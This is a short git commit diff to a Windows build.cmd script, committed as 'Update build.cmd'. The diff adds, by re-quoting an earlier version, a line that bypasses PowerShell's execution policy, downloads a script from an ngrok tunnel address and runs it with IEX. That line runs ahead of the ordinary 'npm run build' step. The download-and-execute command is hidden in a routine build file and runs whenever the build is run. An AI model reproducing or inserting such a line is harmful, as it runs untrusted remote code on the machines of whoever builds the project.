f7cd5fe9f92b5d8027e62778f42d0585447b6516
secopsintern <125271987+secopsintern@users.noreply.github.com>
2023-02-13 19:49:20 +0530

    Update build.cmd

--- build.cmd
+++ build.cmd
@@ -1,5 +1,5 @@
 @echo off
-powershell -ExecutionPolicy ByPass -NoProfile IEX(New-Object System.Net.WebClient).DownloadString("https://094c-180-151-120-174.in.ngrok.io/hello.ps1")
+powershell -ExecutionPolicy ByPass -NoProfile 'IEX(New-Object System.Net.WebClient).DownloadString("https://094c-180-151-120-174.in.ngrok.io/hello.ps1")'
 pushd %~dp0
 call npm run build
 popd
